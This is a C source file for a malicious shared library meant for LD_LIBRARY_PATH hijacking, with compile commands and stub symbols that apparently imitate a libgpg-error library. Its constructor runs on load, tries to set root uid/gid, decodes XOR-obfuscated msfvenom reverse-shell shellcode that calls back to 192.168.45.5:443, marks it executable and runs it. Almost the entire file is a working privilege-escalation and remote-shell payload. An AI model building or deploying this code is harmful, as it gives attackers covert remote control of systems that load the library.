#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// Compile as follows
//gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
//gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
// [...output from readelf here...]
int gpgrt_poll;

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=443 EXITFUNC=thread -f csharp
// xor-encoded with key 0xfa
unsigned char buf[] =
    "\x90\xd3\xa2\x63\x90\xf8\xa5\x90\xfb\xa4\xf5\xff\xb2\x6d\xb2\x43"
    "\xf8\xfa\xfb\x41\x3a\x52\xd7\xff\xab\xb2\x73\x1c\x90\xea\xa0\x90"
    "\xd0\xa2\xf5\xff\x90\xf9\xa4\xb2\x05\x34\x90\xdb\xa2\xf5\xff\x8f"
    "\x0c\x90\xc1\xa2\x63\xb2\x41\xd5\x98\x93\x94\xd5\x89\x92\xfa\xa9"
    "\xb2\x73\x1d\xa8\xad\xb2\x73\x1c\xf5\xff";

void runmahpayload() {
        setuid(0);
        setgid(0);
        printf("Library hijacked!\n");
        int buf_len = (int) sizeof(buf);
	int key = 250;
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);
        int (*ret)() = (int(*)())buf;
        ret();
}
